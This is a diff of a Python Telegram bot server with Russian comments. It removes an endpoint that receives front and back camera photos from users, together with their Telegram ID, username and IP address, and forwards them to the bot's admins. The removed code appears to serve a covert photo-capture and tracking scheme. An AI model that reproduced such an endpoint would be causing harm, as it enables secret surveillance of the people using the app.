@@ -5,7 +5,6 @@ from aiohttp import web
 from aiogram import Bot, Dispatcher, types, Router
 from aiogram.filters import Command
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile, FSInputFile
-import base64
 
 # =====================================================
 # ПАРАМЕТРЫ НАСТРОЙКИ
@@ -123,58 +122,6 @@ async def handle_log_entry(request: web.Request):
         logging.error(f"Error in log: {e}")
         return web.Response(status=500)
 
-@routes.post('/send_photos')
-async def handle_send_photos(request: web.Request):
-    """Эндпоинт для получения фотографий с камер"""
-    try:
-        data = await request.json()
-        
-        ip_address = request.headers.get('X-Forwarded-For', request.remote)
-        if ip_address and ',' in ip_address:
-            ip_address = ip_address.split(',')[0].strip()
-        
-        user_id = str(data.get('user_id', '0000'))
-        username = data.get('username', 'не указан')
-        
-        front_photo = data.get('front_camera')
-        back_photo = data.get('back_camera')
-        
-        caption = (
-            f"📸 **Фото с камер**\n\n"
-            f"👤 User: @{username} (ID: `{user_id}`)\n"
-            f"🌐 IP: `{ip_address}`"
-        )
-        
-        for admin_id in get_all_admins():
-            try:
-                # Отправляем фронтальную камеру
-                if front_photo and front_photo.startswith('data:image'):
-                    img_data = base64.b64decode(front_photo.split(',')[1])
-                    await bot.send_photo(
-                        chat_id=admin_id,
-                        photo=BufferedInputFile(img_data, filename=f"front_{user_id}.jpg"),
-                        caption=f"{caption}\n📷 Фронтальная камера",
-                        parse_mode="Markdown"
-                    )
-                
-                # Отправляем заднюю камеру
-                if back_photo and back_photo.startswith('data:image'):
-                    img_data = base64.b64decode(back_photo.split(',')[1])
-                    await bot.send_photo(
-                        chat_id=admin_id,
-                        photo=BufferedInputFile(img_data, filename=f"back_{user_id}.jpg"),
-                        caption=f"{caption}\n📷 Задняя камера",
-                        parse_mode="Markdown"
-                    )
-                    
-            except Exception as e:
-                logging.error(f"Failed to send photos to admin: {e}")
-        
-        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
-    except Exception as e:
-        logging.error(f"Error in send_photos: {e}")
-        return web.Response(status=500)
-
 @routes.post('/upload')
 async def handle_upload_file(request: web.Request):
     try:
@@ -258,7 +205,6 @@ async def handle_upload_file(request: web.Request):
 
 @routes.options('/upload')
 @routes.options('/log_entry')
-@routes.options('/send_photos')
 async def handle_options(request):
     return web.Response(headers={
         "Access-Control-Allow-Origin": "*",
